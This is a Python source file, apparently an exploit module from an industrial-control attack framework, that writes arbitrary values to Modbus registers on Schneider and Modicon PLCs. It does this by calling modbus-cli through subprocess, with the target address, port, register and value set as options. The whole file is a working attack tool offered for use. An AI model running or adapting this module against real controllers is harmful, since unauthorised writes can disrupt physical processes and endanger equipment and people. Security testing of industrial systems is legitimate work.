import subprocess
from Base import Validators
from Base.Exploits import Exploit, Option
from Utils import print_error, print_success
from Exceptions.ISAFExceptions import ISAFException


class Exploit(Exploit):
    __info__ = {
        'name': 'exploits/modbus/write',
        'display_name': 'Modbus Write',
        'authors': [
            'D0ubl3G <d0ubl3g[at]protonmail.com>',
        ],
        'description': 'Modbus register write using modbus-cli.',
        'references': [
            'https://github.com/tallakt/modbus-cli',
        ],
        'devices': [
            'Schneider',
            'Modicon',
        ],
    }

    target = Option('192.168.1.1', 'Target address', validators=Validators.ipv4)
    port = Option(502, 'Target Port')
    address = Option('%MW100', 'Target Register Address (Schneider-like and Modicon-like)')
    value = Option('1', 'Value to be writed.')

    def run(self):
        try:
            subprocess.call(['modbus', 'write', self.target, self.address, self.value],
                                             stderr=subprocess.STDOUT)
            print_success("Executed successfully.")
        except:
            print_error("Connection Error. Aborting.")
